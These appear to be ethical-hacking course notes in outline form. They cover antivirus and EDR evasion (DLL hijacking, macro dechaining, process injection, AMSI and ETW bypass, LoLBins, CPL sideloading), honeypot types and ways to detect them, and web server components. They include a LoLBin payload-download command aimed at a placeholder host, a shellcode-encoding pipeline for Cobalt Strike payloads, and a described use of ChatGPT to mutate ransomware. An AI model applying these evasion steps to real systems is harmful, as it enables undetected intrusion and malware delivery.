					- Ghostwriting.sh is a tool designed to bypass antivirus software by performing binary deconstruction, inserting arbitrary assembly instructions, and reconstructing the modified code.
					- It leverages built-in Metasploit tools to automate this process.
						- It generates a Meterpreter reverse TCP binary to establish a connection with the attacker's private IP address.
						- The binary is disassembled, and junk code is inserted to evade signature-based detection.
						- The modified binary is then reassembled.
						- Finally, the script opens a web server on the attacker's machine, enabling the transfer of the modified file to the victim's machine while bypassing endpoint security systems.
		- Bypassing Endpoint Security by Exploiting Application Whitelisting:
			- Application whitelisting is a security feature in Windows designed to prevent the execution of unauthorized or malicious applications. It maintains a list of signed applications that are permitted to run on the system.
			- When a legitimate and signed application is executed, Windows searches for the required DLLs (Dynamic Link Libraries) in the same directory as the executable before checking other locations. Attackers exploit this behavior through DLL hijacking by placing a malicious DLL—named identically to the one the application is expecting—within the same directory as the executable. As a result, the malicious DLL is loaded and executed along with the legitimate application, allowing attackers to bypass endpoint security measures.
			- DLL Hijacking and Security Evasion: DLL hijacking exploits how Windows handles DLL loading and its search order, which determines where the system looks for DLLs when a program is launched. By hijacking DLL loading, attackers can:
				- Maintain persistence on a compromised system
				- Escalate privileges
				- Evade detection while executing malicious payloads
			- In addition to DLL hijacking, attackers can use built-in Windows utilities such as rundll32.exe, regsvr32.exe and PowerShell. These tools allow attackers to load malicious DLLs while bypassing security controls.
		- Bypassing Endpoint Security by Dechaining Macros:
			- Microsoft Office macros are widely used to automate tasks, but attackers can exploit them to execute malicious code and compromise systems. Since macros are based on VBScript, attackers craft VBA-based malicious code to manipulate system memory, modify the Windows registry, and alter system files. Dechaining macros is a technique used to evade both static and dynamic detection mechanisms in endpoint security solutions.
			- Techniques for Bypassing Endpoint Security Using Dechained Macros:
				- Spawning Through ShellCOM: Attackers leverage COM objects to spawn processes. By referencing any COM-associated object through VBScript, they can execute arbitrary functions. The ShellBrowserWindow object is commonly used to launch new processes.
				- Spawning Using XMLDOM: Attackers use XMLDOM (XML Document Object Model) to execute process spawning. This technique allows them to download and run code within an active Office process, bypassing security restrictions.
				- Spawning Through WmiPrvse.exe: To launch new processes or executables remotely, attackers exploit Windows Management Instrumentation (WMI). By spawning processes through wmiprvse.exe, attackers can execute code outside the Office process, avoiding detection.
				- Creating Scheduled Tasks: VBScript can be used to create scheduled tasks, allowing attackers to execute malicious payloads at specific times. This technique also enables task dechaining, ensuring the payload executes independently of the original Office macro.
				- Registry Modification: Attackers leverage VBScript to modify the Windows registry, altering system settings, storing payloads, and establishing persistence. Since registry modifications can execute payloads on system boot, the payload execution is decoupled from the macro itself, making detection more difficult.
				- Dropping Files: Using FileSystemObject, attackers can drop files onto the system through VBScript. This method enables dechaining, as payload execution occurs at startup rather than during macro execution.
				- Downloading Content: Attackers use VBScript to download and inject malicious content into memory, the registry, or disk. This is achieved using the XMLHTTP library along with ADODB, allowing attackers to deliver and execute payloads stealthily.
				- Embedding and Dropping Files: Attackers exploit Metasploit’s "vba-exe" feature to create a macro containing an embedded payload. When executed, this payload is dropped onto the system and run, bypassing security controls.
		- Bypassing Endpoint Security by Clearing Memory Hooks:
			- Memory hooking is a technique used to monitor and modify an application's execution process. Endpoint Detection and Response (EDR) agents place these hooks to collect information for behavior-based analysis. These hooks send data to the EDR agent, which operates at a high-privileged kernel level, helping detect malicious activities such as remote code execution, lateral movement, and privilege escalation in real time.
			- For example, if a new process is spawned in a detached state and memory permissions are altered to execute the WriteProcessMemory procedure, the EDR system can still analyze the data and determine whether the running process is malicious.
			- To evade detection, attackers often attempt to bypass EDR monitoring by unhooking EDR-related DLLs from memory. This requires identifying the application's DLLs, associated functions, and exported syscalls. Open-source tools such as the x64dbg debugger are commonly used to locate hooked syscalls stored in memory during execution.
			- Attackers then craft a payload to overwrite these memory hooks by restoring the original bytes of data. This is achieved by reloading the correct memory location where the hooks reside and erasing the EDR-imposed hooks. Once the syscalls are successfully restored, the EDR’s DLL remains on disk but no longer receives any information, as the hooks have been removed.
			- Additionally, attackers can execute malicious payloads using custom assembly code and syscalls to evade EDR detection. Since these syscalls are not exported from system DLLs, EDR solutions fail to detect any activity because their hooks are not triggered. To achieve this, attackers must configure specific variables and registry values to execute their own syscalls while also determining the correct syscall IDs, which vary depending on the target OS and version.
		- Bypassing Endpoint Security with Process Injection:
			- Process injection is a sophisticated technique used by attackers to inject malicious code into the memory of running processes. By injecting code into an active process, malware can evade detection by security software, which often does not continuously monitor the internal state of every process for such modifications. This technique is commonly used as part of a broader attack strategy to maintain persistence, escalate privileges, or execute malicious actions while avoiding detection.
			- Process injection attacks are typically carried out using Windows API functions, such as VirtualAllocEx(), WriteProcessMemory(), and CreateRemoteThread():
				- VirtualAllocEx(): Allocates memory within the address space of a target process. Attackers use this function to reserve a memory block in the target process where they can inject their malicious payload.
				- WriteProcessMemory(): Writes data into the memory space of a remote process. After allocating memory with VirtualAllocEx(), the attacker calls WriteProcessMemory() to inject the malicious payload into the allocated memory space.
				- CreateRemoteThread(): Creates a new thread in the address space of the target process. After injecting the malicious payload, the attacker calls CreateRemoteThread() to execute the injected code within the target process.
			- By leveraging these API functions, attackers can effectively run malicious code within legitimate processes, making detection and mitigation significantly more challenging for security solutions.
    	- Bypassing EDR by Leveraging Living-off-the-Land Binaries (LoLBins):
			- Living off the Land Binaries (LoLBins) are legitimate system tools that come preinstalled on the operating system or are downloaded from trusted sources such as Microsoft. Attackers can exploit these LoLBins for malicious purposes, such as installing malware or maintaining persistence on target networks. By leveraging LoLBins, attackers can evade security solutions since their activities appear normal and authorized.
			- These tools also enable attackers to execute various malicious activities, such as installing command-and-control (C2) agents for advanced post-exploitation control, without triggering alerts or being detected by Endpoint Detection and Response (EDR) systems.
			- Steps to Bypass EDR Using LoLBins
				- Step 1: Payload Generation
					- Configure the agent in Deimos C2 (a Golang-based command-and-control framework) to communicate over HTTPS.
					- Download the generated agent and upload it to an external HTTP server.
				- Step 2: Agent Download
					- Execute the following command to use a Windows binary to download a remote file from the specified URL:
					- C:\> ConfigSecurityPolicy.exe http://example.com/payload
				- Step 3: Agent Execution
					- Use CustomShellHost.exe to execute the downloaded payload and replace Explorer.exe with a custom application.
					- On Windows 10 or 11, attackers with user privileges can run the following command to achieve this:
					- C:\> CustomShellHost.exe
			- By abusing LoLBins, attackers can effectively bypass EDR monitoring and execute malicious payloads while appearing to use legitimate system tools.
		- Bypassing Endpoint Security Using CPL (Control Panel) Side-Loading:
			- CPL files are typically developed for Windows Control Panel applets, providing quick access to various system tools. However, attackers can exploit CPL files to evade detection by leveraging legitimate .cpl files, which are commonly associated with Windows Control Panel utilities. This technique, known as CPL sideloading, mimics the functionality of a legitimate CPL applet, making malicious activities appear legitimate to both users and security systems.
			- When a user executes a legitimate CPL file, malicious code embedded within the file is loaded. This can be achieved through various methods such as executing a specific function within the CPL file or exploiting vulnerabilities in how Windows handles CPL files.
			- Attackers embed malicious payloads in CPL files and trick Windows into loading them via trusted applications instead of executing them directly. This can involve modifying application configuration files or leveraging startup execution for persistence. Since CPL files are rarely flagged as malicious, traditional security solutions often overlook them during routine scans.
			- A common method involves renaming malicious DLLs (.dll) files with a .cpl extension and registering them at a specific location in the Windows Registry. Even if they lack standard CPL functions, they can still execute via DllEntryPoint when the Control Panel is accessed.
			- Creating Malicious CPL Files Using CPLResourceRunner:
				- Attackers can use tools such as CPLResourceRunner to generate malicious CPL files by following these steps:
				- Step 1: Generate a Payload
					- Use Cobalt Strike to generate a fully staged payload in x86 format, saving it as beacon.bin.
				- Step 2: Convert the Payload to Shellcode
					- Execute ConvertShellcode.py on beacon.bin to transform it into usable shellcode and save it as shellcode.txt.
				- Step 3: Encode the Shellcode in Base64
					- Run the following command to encode shellcode.txt into Base64 format for inclusion in a resource file:
					- cat shellcode.txt | sed 's/[, ]//g; s/0x//g;' | tr -d '\n' | xxd -p -r | gzip -c | base64 > b64shellcode.txt
				- Step 4: Prepare the Resource File
					- Copy the encoded content from b64shellcode.txt into Resources.txt in the same folder.
				- Step 5: Compile the Malicious CPL File
					- Compile the resources in x86 format and copy CPLResourceRunner.dll into a new file named maliciousnew.cpl.
			- By leveraging CPL sideloading, attackers can effectively bypass security measures, execute malicious payloads through trusted system components, and evade traditional detection mechanisms.
    	- Abusing AI Tools - Bypassing Endpoint Security Using ChatGPT:
			- Attackers can leverage ChatGPT to mutate malicious code and generate multiple variations, making detection more difficult for security systems.
			- Steps Involved in the Attack
				- Obtaining the Code: In this phase, attackers use ChatGPT to generate code snippets for locating specific files that ransomware may target for encryption. They can also request ChatGPT to generate a file-encryption utility, enabling them to encrypt files once they have been identified.
				- Validation: Attackers review and refine the generated code to ensure it functions as intended while maintaining stealth.
				- Execution: Once the malicious code is ready, attackers execute it using built-in Python functions such as: compile(source, mode, exec), exec(), eval(). These functions allow the malware to run dynamically on different platforms. Additionally, malware with a built-in Python interpreter can execute the code directly, then erase it afterward to evade detection by security systems.
    	- Bypassing Antivirus Using Metasploit Templates:
			- Attackers aim to ensure that their malicious payloads bypass antivirus detection on victim machines. One common technique involves using Metasploit Templates to evade security measures.
			- Attackers generate a malicious payload using msfvenom and analyze the file using VirusTotal to determine its detection rate. Based on the results, they continuously modify the Metasploit Templates to reduce detection and successfully evade antivirus software.
    	- Bypassing Windows Antimalware Scan Interface (AMSI):
			- The Antimalware Scan Interface (AMSI) is a Windows API designed to enhance malware protection by integrating with compatible antimalware software. It provides signature-based and reputation-based detection to identify malicious activity. However, attackers can bypass AMSI by manipulating functions, URLs, or internal system files to evade detection.
			- Techniques for Bypassing AMSI:
				- PowerShell Downgrade: Attackers can downgrade PowerShell to version 2.0, which lacks AMSI integration, allowing them to execute blocked commands like amsiutils.
				- Obfuscation: Obfuscation involves modifying and obscuring malicious code to evade AMSI detection. Attackers achieve this by breaking strings and concatenating them using the + operator. Tools like AmsiTrigger help attackers identify specific lines that trigger AMSI scans for targeted obfuscation.
				- Forcing an Error: This technique exploits AMSI’s initialization process by modifying the amsiInitFailed() function. Normally, this function returns 0 (indicating a successful scan), but attackers can modify it to Boolean True, forcing an error during AMSI initialization. This allows them to bypass AMSI by altering memory allocations within the AmsiUtils class.
				- Memory Hijacking: Attackers manipulate AMSI’s internal functions using memory hijacking. By hooking the AmsiScanBuffer() function, they force it to always return AMSI_RESULT_CLEAN, effectively allowing any malware to execute undetected.
		- Hosting Phishing Sites on Popular Infrastructure:
			- Organizations use Endpoint Detection and Response (EDR) to block malicious IP addresses associated with phishing campaigns and other cyber threats. These blacklists are continuously updated from various sources. However, attackers exploit this by hosting phishing sites on trusted cloud infrastructure such as Google Cloud and AWS, which are rarely blacklisted.
			- Since most popular cloud hosting services are not included in EDR blacklists, attackers use them as Command and Control (C&C) servers to carry out malicious activities. Additionally, attackers can distribute malware via social media platforms by embedding malicious code in images or multimedia files using steganography. Pre-infected malware on the victim's machine extracts hidden instructions from these files to bypass endpoint security mechanisms.
		- Passing Encoded Commands:
			- Attackers encode their malicious commands to bypass detection mechanisms. A common technique is Base64 encoding, which helps conceal malicious arguments and scripts. Additionally, hex-format encoding can be used to obfuscate ping requests to evade security tools.
		- Fast Flux DNS Method:
			- Attackers employ fast flux DNS to rapidly change both IP addresses and domain names, making detection more difficult. This technique is frequently used by large botnets to evade blacklists and security filters. By using compromised systems as reverse proxies, attackers can conceal the actual C&C server, ensuring that victims only interact with fast flux agents instead of the real malicious server.
		- Timing-Based Evasion:
			- Timing-based evasion is a sandbox detection bypass technique where malware delays execution until certain conditions are met.
			- These conditions can include:
				- Waiting for specific user actions, such as opening a window or clicking a button.
				- Delaying execution until system reboot to blend with legitimate processes.
				- Using sleep patching, delay APIs, or time bombs to avoid early detection by security software.
    	- Signed Binary Proxy Execution:
			- This technique leverages trusted system utilities to execute malicious code while avoiding EDR detection. Since these utilities are digitally signed by legitimate vendors, they are considered safe by security solutions. Attackers often use rundll32.exe to execute malicious payloads by proxying them through trusted Windows processes.
    	- Shellcode Encryption:
			- Attackers encrypt malicious shellcode to evade EDR detection.
			- Common encryption methods include:
				- XOR and RC4 encryption, where decryption keys are embedded in the malware or generated dynamically.
				- AES encryption, which hides static signatures of shellcode, making it harder for security tools to detect.
				- Once executed, the malware decrypts the shellcode in memory and runs it without writing anything suspicious to disk, making it difficult for security solutions to detect.
		- Reducing Entropy:
			- Attackers manipulate a binary’s characteristics to make it appear less suspicious to security solutions. One method is reducing entropy, which involves embedding low-entropy resources (e.g., low-entropy images) into the binary. Attackers can also add legitimate system strings, such as chrome.dll, to lower the binary’s entropy and avoid detection.
    	- Escaping Local Antivirus (AV) Sandboxes:
			- EDR solutions often analyze binaries within a local sandbox for a short period (typically a few seconds) to assess their behavior while minimizing impact on user experience. Attackers exploit this limitation by delaying shellcode execution to outlast the sandbox analysis window. One technique involves performing CPU-intensive tasks, such as calculating large prime numbers, to prolong the decryption process of shellcode, thereby bypassing sandbox-based behavioral detection.
    	- Disabling Event Tracing for Windows (ETW)
		- Disabling Event Tracing for Windows (ETW):
			- Many EDR solutions, especially Microsoft Defender for Endpoint, rely on Event Tracing for Windows (ETW) to monitor system activity.
			- ETW includes:
				- Kernel-level components, which register callbacks for system and kernel operations.
				- Userland components within ntdll.dll, allowing detailed tracking of Windows API calls.
			- Attackers can bypass ETW by patching the EtwEventWrite function, a key function in ntdll.dll. By modifying its instructions to return zero (SUCCESS), attackers effectively disable ETW logging and evade detection.
		- Direct System Calls and Evading “Mark of the Syscall”:
			- Security solutions often hook API functions in ntdll.dll to monitor malicious activity. Attackers bypass these hooks by using direct system calls instead of standard API calls.
			- For example:
				- Instead of calling VirtualAlloc, attackers call its kernel-equivalent function NtAllocateVirtualMemory directly from ntdll.dll.
				- Attackers can retrieve syscall IDs from ntdll.dll, push the required arguments onto the stack, and invoke system calls using syscall <id> instructions, bypassing security hooks.
    	- Spoofing the Thread Call Stack:
			- Malware implants often exhibit beaconing behavior, where they remain dormant until receiving commands from a Command and Control (C2) server. During this idle state, EDR solutions use memory scanning techniques to detect anomalies.
			- A common detection method is analyzing thread return addresses—if a return address points to shellcode in memory, it is flagged as suspicious. Attackers evade this by spoofing the call stack:
				- Intercepting Sleep(): When malware calls Sleep(), attackers overwrite the return address with 0×0, breaking the link between the shellcode and the return address.
				- After Sleep() returns, they restore the original return address, ensuring normal execution resumes without detection.
		- In-memory Encryption of Beacons:
			- To evade memory-based detection, attackers encrypt the executable memory regions of malware when it is dormant.
			- This is done through:
				- Identifying a beacon sleep hook (e.g., Sleep()).
				- Locating the memory segment containing shellcode.
				- If the memory segment is MEM_PRIVATE and EXECUTABLE, encrypting it using XOR or another lightweight encryption algorithm.
				- Calling Sleep(), pausing execution while the shellcode remains encrypted.
				- Upon Sleep() return, decrypting and restoring the shellcode for execution.
			- By encrypting malicious code while dormant and decrypting it only when needed, attackers significantly reduce the risk of detection by security solutions.

- Honeypot:
	- A honeypot is a computer system or information system resource on the Internet designed to attract and trap individuals attempting unauthorized or illicit access to an organization’s network. It is a decoy system used to monitor and log malicious activity, often enabling security teams to analyze attack methods and report offenders to their ISPs.
	- Honeypots have no legitimate business or production value; any interaction with them is typically indicative of a probe, attack, or compromise attempt. While they do not directly solve a specific security problem, they serve as highly flexible tools with various security applications, including attack prevention, threat detection, and cybersecurity research.
	- A honeypot can log port access attempts, monitor an attacker's keystrokes, and provide early warnings of potential cyber threats. However, maintaining a honeypot requires significant effort and resources.
	- Types of Honeypots:
		- Classification of Honeypots Based on Design Criteria:
			- Low-Interaction Honeypots:
				- Low-interaction honeypots emulate only a limited number of services and applications of a target system or network. If an attacker performs an action that the emulation does not anticipate, the honeypot simply generates an error. These honeypots capture limited information, primarily transactional data and basic interactions. Since they do not provide full system access, they cannot be fully compromised. Their primary purpose is to collect high-level information about attack vectors, such as network probes and worm activities.
				- Some examples of low-interaction honeypots include Tiny-SSH-Honeypot, KFSensor, and Honeytrap:
				- KFSensor:
					- A low-interaction honeypot used to attract and identify penetration attempts. It simulates vulnerable system services and Trojans to lure hackers. KFSensor can monitor all TCP, UDP, and ICMP ports and services, raising alerts for activities such as port scanning and DoS attacks.
				- Honeytrap:
					- A low-interaction honeypot designed to observe attacks against TCP and UDP services. It runs as a daemon, dynamically initiating server processes on requested ports. Attackers are tricked into sending responses to the Honeytrap server process. The received data is concatenated into a string and stored in a database file, known as the attack string.
					- Honeytrap also analyzes attack strings for commands that request the server to download a file from another host on the network. If such a command is detected, the server attempts to retrieve the corresponding file automatically. It supports only FTP and TFTP protocols and is also capable of identifying and logging HTTP URIs.
			- Medium-Interaction Honeypots:
				- Medium-interaction honeypots simulate an actual operating system, along with applications and services of a target network. They provide a more convincing illusion of a real OS than low-interaction honeypots, allowing for the logging and analysis of more complex attacks. These honeypots capture more valuable data than low-interaction honeypots but can only respond to preconfigured commands, which increases the risk of intrusion.
				- One major drawback of medium-interaction honeypots is that attackers may quickly recognize abnormal system behavior, making them aware of the deception.
				- Some examples of medium-interaction honeypots include Cowrie, Honeygrove, and Kippo:
				- Cowrie:
					- A medium-to-high interaction SSH and Telnet honeypot designed to log brute-force attacks and shell interactions performed by attackers.
					- In medium-interaction mode (shell), Cowrie emulates a UNIX system using Python.
					- In high-interaction mode (proxy), it functions as an SSH and Telnet proxy, allowing security researchers to observe an attacker’s behavior on another system.
			- High-Interaction Honeypots:
				- Unlike low- and medium-interaction honeypots, high-interaction honeypots do not emulate services or applications; instead, they run actual vulnerable software on real operating systems and production environments. These honeypots simulate all services and applications of a target network, allowing attackers to fully compromise the system within a controlled environment.
				- High-interaction honeypots capture extensive data about attack vectors, including techniques, tools, and intent. However, since they involve real systems, they are more susceptible to infection, as attacks are executed on actual production systems.
				- A honeynet is a prime example of a high-interaction honeypot. Unlike a standalone product or software solution, a honeynet is an entire network of computers designed to attract and analyze attacks. It provides a highly controlled environment with real systems running real applications, where all activities are carefully monitored and logged. Attackers discover and infiltrate honeynets on their own, unaware that they are being observed.
				- To capture all attacker activities—such as encrypted SSH sessions, emails, and file uploads—honeynets use kernel-level monitoring tools. At the same time, they regulate attacker behavior through a honeywall gateway, which:
					- Allows inbound traffic to reach the target systems.
					- Controls outbound traffic using intrusion prevention technologies, preventing attackers from harming non-honeynet computers.
				- This setup gives attackers the illusion of unrestricted access while ensuring that their actions remain contained and monitored.
			- Pure Honeypots:
				- Pure honeypots replicate the real production network of a target organization, deceiving attackers into believing they are infiltrating critical systems. By engaging attackers and consuming their time and resources, these honeypots help security teams identify vulnerabilities and potential threats.
				- As attackers probe the system, they trigger alerts that allow network administrators to detect early warning signs of an attack, enabling them to take proactive measures to reduce the risk of an actual intrusion.
		- Classification of Honeypots Based on Deployment Strategy:
			- Production Honeypots:
				- Production honeypots are deployed within an organization’s production network alongside other operational servers. While they enhance the overall security posture of the organization, they capture only a limited amount of information about adversaries. These honeypots typically fall under the low-interaction honeypot category and are widely used by large organizations and corporations.
				- Since production honeypots are deployed internally, they also help identify internal security flaws and detect insider threats within an organization.
			- Research Honeypots:
				- Research honeypots are high-interaction honeypots primarily used by research institutions, governments, and military organizations to study intruder behavior in detail. These honeypots enable security analysts to gain in-depth insights into attack methodologies, vulnerability exploitation, and attacker techniques. This knowledge helps organizations improve their attack prevention, detection, and response mechanisms, ultimately strengthening their overall cybersecurity infrastructure.
				- However, research honeypots do not directly contribute to an organization’s security. Companies looking to enhance their production infrastructure security should prioritize production honeypots instead.
		- Classification of Honeypots Based on Deception Technology:
			- Malware Honeypots:
				- Malware honeypots are designed to detect and analyze malware campaigns targeting network infrastructure. These honeypots simulate known vulnerabilities, such as outdated APIs and vulnerable SMBv1 protocols, and emulate various Trojans, viruses, and backdoors to attract adversaries into exploiting them. By luring attackers and malware into performing attacks, security teams can effectively identify attack patterns, malware signatures, and threat actors behind the campaigns.
			- Database Honeypots:
				- Database honeypots use fake, intentionally vulnerable databases to attract attackers attempting SQL injection, database enumeration, and other database-related attacks. These databases appear to contain sensitive information, such as customer credit card details and employee records, tricking attackers into attempting exploitation. However, all stored data is simulated and fake.
				- By analyzing these attacks, security analysts can identify attack patterns and threat actor tactics, techniques, and procedures (TTPs) related to database exploitation.
			- Spam Honeypots:
				- Spam honeypots are designed to attract spammers who abuse open mail relays and proxies to distribute spam. These honeypots typically consist of mail servers that deliberately accept emails from any random source on the Internet. They help security teams gather crucial information about spammers, their tactics, and their infrastructure, aiding in anti-spam measures.
			- Email Honeypots:
				- Also known as email traps, email honeypots consist of fake email addresses designed to attract and collect malicious emails sent by adversaries. These fake email addresses are distributed across the open Internet and dark web, luring threat actors into sending phishing, scam, or malware-laden emails.
				- By continuously monitoring incoming emails, security teams can analyze deception techniques used by attackers and warn internal employees about emerging email-based threats.
			- Spider Honeypots:
				- Also called spider traps, spider honeypots are designed to capture malicious web crawlers and spiders used by attackers for web reconnaissance and data extraction. Threat actors often use automated crawling tools to gather URLs, contact details, and directory structures from websites.
				- To counter this, a fake website is set up to mimic a legitimate one. Any entity attempting to crawl the trap site is identified, monitored, and blacklisted, preventing them from gathering valuable information.
			- Honeynets:
				- Honeynets are networks of interconnected honeypots designed to provide a broader view of adversary tactics. They are typically deployed in isolated virtual environments and may include vulnerable servers to attract attackers.
				- By monitoring adversary behavior across multiple honeypots, honeynets help security teams analyze enumeration methods, exploitation techniques, and attacker capabilities in a real-world attack scenario. This intelligence is invaluable for enhancing security defenses and mitigating threats effectively.

		- StingBox (www.stingbox.com)
	- Detecting Honeypots:
		- For attackers, detecting honeypots within a target organization's network is crucial to avoid security traps. To identify these decoys, attackers employ various techniques, such as service fingerprinting, analyzing response times, identifying unexpected open ports, and detecting weak system configurations. By carefully examining these factors, they attempt to evade detection and maintain stealth within the target network.
		- Methods for Detecting Honeypots:
			- Fingerprinting the Running Service:
				- Service fingerprinting involves identifying the specific services running on a network device. Since honeypots often emulate services, they may not perfectly replicate all aspects of a real service, leading to detectable discrepancies.
				- Attackers use tools like Nmap to conduct detailed scans, sending various probes to the target and analyzing their responses to determine whether a service is genuine or emulated.
				- Example - This command identifies the web server type and version running on port 80: nmap -sV -p 80 <target_ip>
				- Indicators of Honeypot:
					- Inconsistencies between claimed and actual service behavior (e.g., a service claims to be one version but behaves like another).
					- Partial or incorrect implementation of expected features (e.g., a web server may lack essential functionalities that a real server would have).
			- Analyzing Response Time:
				- Response time analysis is a crucial technique for detecting honeypots within a target network. Honeypots often exhibit slower or inconsistent response times due to additional layers of logging, monitoring, and emulation. This extra processing introduces noticeable latency compared to real production systems.
				- Attackers measure latency across various network services and compare the results with expected norms. Tools like Ping, Traceroute, and Nmap are commonly used to measure round-trip times (RTT) of packets, helping identify anomalies.
				- Example - This command measures response times for HTTP services by introducing delays and limiting retries: nmap -p 80 --scan-delay 1s --max-retries 5 <target_ip>
				- Indicators of Honeypot:
					- Consistently high response times compared to normal network behavior.
					- Unusual variability in response times, indicating additional processing layers.
			- Analyzing MAC Address:
				- Attackers analyze MAC addresses to detect honeypots within a target organization's network. Each MAC address has a specific prefix, known as an Organizationally Unique Identifier (OUI), which identifies the manufacturer of the network interface card (NIC). By examining irregularities in MAC addresses, attackers can detect virtualization technologies or honeypot software, as these often use virtual or non-standard OUIs.
				- Example - This command enumerates MAC addresses on the local network: arp-scan --interface=eth0 --localnet
				- Indicators of Honeypot:
					- MAC addresses with unusual OUIs that do not correspond to known hardware manufacturers.
					- MAC addresses associated with virtual machines (e.g., VMware, VirtualBox, or Hyper-V).
			- Enumerating Unexpected Open Ports:
				- Identifying unexpected open ports in a target network is a key technique for detecting honeypots. Honeypots often have open ports that are not typically active on regular systems or may display a higher-than-normal number of open ports. This discrepancy serves as a red flag for attackers.
				- Port-scanning tools like Nmap can be used to enumerate open ports and identify unusual network behavior.
				- Example - This command scans all 65,535 ports on the target IP, revealing which ports are open and what services may be running: nmap -p- <target_ip>
				- Indicators of Honeypot:
					- A standard web server typically has only ports 80 (HTTP) and 443 (HTTPS) open.
					- If a scan reveals additional open ports—such as 22 (SSH), 21 (FTP), or various high-numbered ports without a clear purpose—it may indicate a honeypot.
			- Analyzing System Configuration and Metadata:
				- This method involves scrutinizing system details that are often overlooked to detect honeypots within a network. Attackers examine configuration settings, system metadata, and environmental information to uncover inconsistencies or default settings that may indicate a honeypot.
				- By analyzing system banners (e.g., SSH welcome messages, HTTP headers) and metadata, attackers gather information about the operating system, software versions, and configuration details to identify anomalies.
				- Indicators of Honeypot:
					- Default configurations that have not been modified.
					- Outdated banners revealing obsolete software versions.
					- Discrepancies in system information that do not match typical production environments.
	- Detecting and Defeating Honeypots:
		- A honeypot is a security mechanism designed to trap and analyze attackers' activities. By luring attackers into interacting with a controlled system, security teams can gain insights into potential threats to their network infrastructure. However, for attackers, distinguishing between a real system and a honeypot is crucial to avoiding detection. Identifying and bypassing honeypot defenses is a fundamental skill for professional hackers.
		- The following techniques are commonly used to detect, identify, and defeat various honeypot infrastructures:
			- Detecting Layer 7 Tar Pits:
				- Layer 7 tar pits slow down unauthorized activities, particularly SMTP-based attacks. They achieve this by introducing delays in responses to spam or hacking attempts.
				- Detection Method: Attackers can identify Layer 7 tar pits by analyzing response latencies.
				- Indicators: Abnormally slow responses to SMTP commands can indicate the presence of a tar pit.
			- Detecting Layer 4 Tar Pits:
				- Layer 4 tar pits manipulate the TCP/IP stack to slow down worms, backdoors, and automated threats. They achieve this by accepting incoming connections and then setting the TCP window size to zero, preventing data transmission.
				- Detection Method: Attackers analyze TCP window sizes and connection behavior.
				- Indicators: Continuous ACK packets with a zero TCP window size suggest a tar pit. Example: LaBrea honeypot.
			- Detecting Layer 2 Tar Pits:
				- Layer 2 tar pits block unauthorized access within the same local network to prevent lateral movement.
				- Detection Method: Attackers examine MAC addresses and ARP responses.
				- Indicators: The presence of MAC address 00:00:0F:FF:FF:FF suggests a Layer 2 tar pit.
			- Detecting Honeypots Running on VMware:
				- VMware is widely used for running virtual honeypots. Since each virtual machine has a unique MAC address prefix, attackers can detect honeypots using this method.
				- Detection Method: Attackers inspect MAC address prefixes using IEEE OUI listings.
				- Indicators: MAC addresses belonging to VMware Inc. (e.g., 00:05:69, 00:0C:29) indicate a virtual environment.
			- Detecting Honeyd Honeypots:
				- Honeyd is a widely used honeypot daemon that simulates entire network environments.
				- Detection Method: Attackers use time-based TCP fingerprinting to analyze SYN-ACK responses.
				- Indicators: Differences in response timing between a honeypot and a real system expose its presence.
			- Detecting User-Mode Linux (UML) Honeypots:
				- User-Mode Linux (UML) is an open-source tool used for deploying honeypots. It can be detected by analyzing system files.
				- Detection Method: Attackers check system files for UML-specific entries.
				- Indicators: Presence of UML-specific files such as: /proc/mounts, /proc/interrupts, /proc/cmdline
			- Detecting Snort_inline Honeypots:
				- Snort_inline is a modified version of Snort IDS that allows real-time packet manipulation to block known threats.
				- Detection Method: Attackers analyze outgoing packets for modifications.
				- Indicators:
					- Dropped outgoing packets may suggest a black hole effect.
					- Modified packets can be identified by cross-checking them from another host.
			- Detecting Fake Access Points (Fake APs):
				- Fake APs create bogus 802.11 beacon frames to mislead attackers. However, they do not generate real traffic.
				- Detection Method: Attackers monitor wireless network traffic.
				- Indicators: A large number of beacon frames with no actual network traffic suggest a Fake AP.
			- Detecting Bait and Switch Honeypots:
				- Bait and switch honeypots dynamically redirect malicious traffic to a honeypot once an attack is detected.
				- Detection Method: Attackers analyze TCP/IP parameters such as: Round-Trip Time (RTT), Time To Live (TTL), TCP timestamps
				- Indicators: If these values change unexpectedly during an attack, it may indicate a honeypot redirecting traffic.
	- Honeypot Detection Tools:
		- Attackers use honeypot detection tools such as Send-Safe Honeypot Hunter and SniffingBear to identify honeypots within target organizational networks.
		- Send-Safe Honeypot Hunter (www.send-safe.com):
			- Send-Safe Honeypot Hunter is a tool designed to scan and identify honeypots within lists of HTTPS and SOCKS proxies. It can check multiple proxy lists simultaneously and automate validation processes.
			- Features: It supports checking HTTPS, SOCKS4, and SOCKS5 proxies with any port, processes multiple remote or local proxy lists at once, automatically validates proxy lists at specified intervals, and can upload filtered lists ("Valid proxies" and "All except honeypots") to an FTP server. Additionally, it can be used for standard proxy validation.

# Hacking Web Servers


- Web Server:
	- A web server is a computer system that stores, processes, and delivers web pages to global clients via the Hypertext Transfer Protocol (HTTP). In general, a client initiates communication through an HTTP request. When a client requests a resource such as a web page, photo, or video, the browser generates an HTTP request and sends it to the web server. The web server then retrieves the requested content from data storage or application servers and responds to the client with an appropriate HTTP response. If the requested information cannot be found, the web server generates an error message.
	- Components of a Web Server:
		- Document Root:
			- The document root is the primary directory of the web server that stores essential HTML files related to a domain’s web pages. These files are sent in response to client requests.
			- For example, if the requested URL is www.certifiedhacker.com, and the document root is named "certroot" (stored in the directory /admin/web), then the document directory address is: /admin/web/certroot
			- If the complete request is www.certifiedhacker.com/P-folio/index.html, the server will search for the file at: /admin/web/certroot/P-folio/index.html
		- Server Root:
			- The server root is the top-level directory in the web server’s directory structure. It contains server configuration files, log files, and executable files necessary for server operation. Typically, it includes the following subdirectories:
				- conf: Stores the server's configuration files.
				- logs: Contains server log files, including access and error logs.
				- cgi-bin: Holds Common Gateway Interface (CGI) scripts or other server-side executables.
			- The server root may also include additional directories or files depending on the specific server software and its configuration.
		- Virtual Document Tree:
			- A virtual document tree allows storage on a different machine or disk when the original disk reaches capacity. It is case-sensitive and can also provide object-level security.
			- For example, in the case of www.certifiedhacker.com/P-folio/index.html, if the directory /admin/web/certroot is stored on a different disk, the server can still locate the requested file.
		- Virtual Hosting:
			- Virtual hosting is a technique that enables multiple domains or websites to be hosted on the same server. This allows efficient resource sharing and is commonly used by large-scale organizations that require global access and management.
			- The types of virtual hosting include: Name-based hosting, Internet Protocol (IP)-based hosting, Port-based hosting
		- Web Proxy:
			- A web proxy is a server positioned between a web client and a web server. Since all client requests are routed through the proxy before reaching the web server, proxies help prevent IP blocking and maintain user anonymity.

	- Apache Web Server Architecture (httpd.apache.org):
